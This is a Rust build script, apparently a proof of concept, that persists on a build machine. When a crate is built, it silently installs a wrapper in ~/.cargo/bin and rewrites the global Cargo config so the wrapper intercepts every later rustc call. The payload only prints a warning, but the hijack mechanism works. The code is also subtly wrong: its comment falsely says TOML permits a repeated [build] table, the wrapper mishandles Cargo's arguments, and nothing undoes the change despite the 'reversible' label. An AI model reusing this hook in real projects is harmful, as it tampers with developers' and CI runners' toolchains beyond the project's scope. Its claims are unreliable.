// Safe, reversible runner-persistence PoC.
// Installs ~/.cargo/bin/rustc-wrapper and points Cargo to it via ~/.cargo/config.toml.
// Prints a WARNING on every rustc invocation, then execs the real compiler.
// No secrets, no network, non-destructive.

use std::{env, fs, io, path::PathBuf};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn make_exec(p: &PathBuf) -> io::Result<()> {
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(p)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(p, perms)?;
    }
    Ok(())
}

fn main() {
    let home = env::var("HOME").unwrap_or_default();
    let cargo_dir = PathBuf::from(format!("{home}/.cargo"));
    let bin_dir = cargo_dir.join("bin");
    let wrapper = bin_dir.join("rustc-wrapper");
    let config = cargo_dir.join("config.toml");

    // Ensure ~/.cargo/bin exists
    let _ = fs::create_dir_all(&bin_dir);

    // Write the wrapper (prints once per rustc call, then execs the real compiler)
    let wrapper_body = r#"#!/usr/bin/env bash
# SAFE_RUNNER_PERSIST_POC rustc-wrapper
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== rustc $* (safe: no secrets, no network)" 1>&2
exec "${RUSTC:-rustc}" "$@"
"#;

    match fs::write(&wrapper, wrapper_body.as_bytes()) {
        Ok(_) => {
            let _ = make_exec(&wrapper);
            println!("cargo:warning=PoC: installed ~/.cargo/bin/rustc-wrapper");
        }
        Err(e) => {
            println!("cargo:warning=PoC: failed to write rustc-wrapper: {e}");
            return;
        }
    }

    // Ensure Cargo uses the wrapper via ~/.cargo/config.toml
    let wrapper_path = wrapper.display().to_string();
    let setting_line = format!(r#"rustc-wrapper = "{}""#, wrapper_path);

    match fs::read_to_string(&config) {
        Ok(mut existing) => {
            if existing.contains("rustc-wrapper") {
                println!("cargo:warning=PoC: rustc-wrapper already configured in ~/.cargo/config.toml");
            } else {
                // Append our own [build] block at the end (TOML allows multiple tables; last wins)
                existing.push_str("\n[build]\n");
                existing.push_str(&setting_line);
                existing.push('\n');
                if fs::write(&config, existing).is_ok() {
                    println!("cargo:warning=PoC: set build.rustc-wrapper in ~/.cargo/config.toml");
                } else {
                    println!("cargo:warning=PoC: failed to update ~/.cargo/config.toml");
                }
            }
        }
        Err(_) => {
            let new_cfg = format!("[build]\n{}\n", setting_line);
            if fs::write(&config, new_cfg).is_ok() {
                println!("cargo:warning=PoC: created ~/.cargo/config.toml with rustc-wrapper");
            } else {
                println!("cargo:warning=PoC: failed to create ~/.cargo/config.toml");
            }
        }
    }
}
